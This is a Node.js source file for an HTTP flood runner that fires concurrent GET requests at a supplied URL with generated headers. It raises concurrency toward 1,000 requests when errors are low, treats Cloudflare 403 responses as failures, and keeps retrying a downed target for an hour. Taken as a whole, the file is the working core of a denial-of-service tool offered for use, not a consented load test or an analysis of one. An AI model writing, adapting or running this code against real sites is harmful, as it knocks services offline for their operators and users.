const { sleep } = require('./helpers')
const { spawnClientInstance } = require('./client/client')
const { generateRequestHeaders } = require('./client/headers')

// stop process is service is down within DELAY * ATTEMPTS (1 hour)
const FAILURE_DELAY = 5 * 60 * 1000
const ATTEMPTS = 12
// concurrent requests adopts based on error rate, but won't exceed the max value
const MAX_CONCURRENT_REQUESTS = 1000

const cloudflareServer = 'cloudflare'

/**
 * @param {string} url
 * @param {EventEmitter} eventEmitter
 */
const runner = async (url, eventEmitter) => {
  if (typeof url !== 'string' || url.length < 10 || !url.startsWith('http')) {
    console.log('Invalid value for URL', url)
    return
  }
  const printUrl = url.length > 63 ? url.substring(0, 63) + '...' : url

  let concurrentReqs = 5
  console.log('Starting process for', printUrl)

  const client = spawnClientInstance(url)

  let isRunning = true
  let isActive = true
  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0
  let failureAttempts = 0

  let errRate = 0
  let total_reqs = 0
  let new_reqs = 0
  let rps = 0

  const getStatsFn = () => {
    eventEmitter.emit('RUNNER_STATS', { url: printUrl, total_reqs, new_reqs, errRate, rps, concurrentReqs, isActive })
    new_reqs = 0
  }
  eventEmitter.on('GET_STATS', getStatsFn)

  const adaptivenessInterval = 15
  const adaptIntervalFn = () => {
    if (failureAttempts === 0) {
      rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
      lastMinuteOk = 0
      lastMinuteErr = 0

      if (errRate > 40) {
        concurrentReqs = Math.floor(rps * 0.6)
      } else if (errRate > 15) {
        concurrentReqs = Math.floor(rps * 0.8)
      } else if (errRate > 5) {
        concurrentReqs = Math.floor(rps * 0.9)
      } else if (errRate < 2) {
        concurrentReqs = Math.min(Math.floor((rps + 4) * 1.2), MAX_CONCURRENT_REQUESTS)
      }
    }
  }
  let adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)

  const stopEventFn = () => {
    isRunning = false
    clearInterval(adaptInterval)
  }
  eventEmitter.once('RUNNER_STOP', stopEventFn)

  while (isRunning) {
    if (concurrentReqs < 3 || errRate > 95) {
      clearInterval(adaptInterval)
      console.log(printUrl, 'is not reachable. Retrying in', FAILURE_DELAY, 'ms...')
      failureAttempts++
      // stop process
      if (failureAttempts >= ATTEMPTS) {
        isRunning = false
      } else {
        concurrentReqs = 5
        isActive = false
        await sleep(FAILURE_DELAY)
        isActive = true
        lastMinuteOk = 0
        lastMinuteErr = 0
        errRate = 0
        adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)
      }
    } else if (pending < concurrentReqs) {
      pending++

      client
        .get('', {
          headers: generateRequestHeaders(),
        })
        .then((res) => {
          if (res.status === 403 && res.headers.server === cloudflareServer) {
            lastMinuteErr++
          } else {
            failureAttempts = 0
            lastMinuteOk++
          }
        })
        .catch(() => {
          lastMinuteErr++
        })
        .finally(() => {
          pending--
          total_reqs++
          new_reqs++
          errRate = Math.floor(100 * (lastMinuteErr / (1 + lastMinuteErr + lastMinuteOk)))
        })
    }
    await sleep(1)
  }

  clearInterval(adaptInterval)
  eventEmitter.off('GET_STATS', getStatsFn)
  eventEmitter.off('RUNNER_STOP', stopEventFn)
  console.log('Stopping runner for:', printUrl)
}

module.exports = { runner }
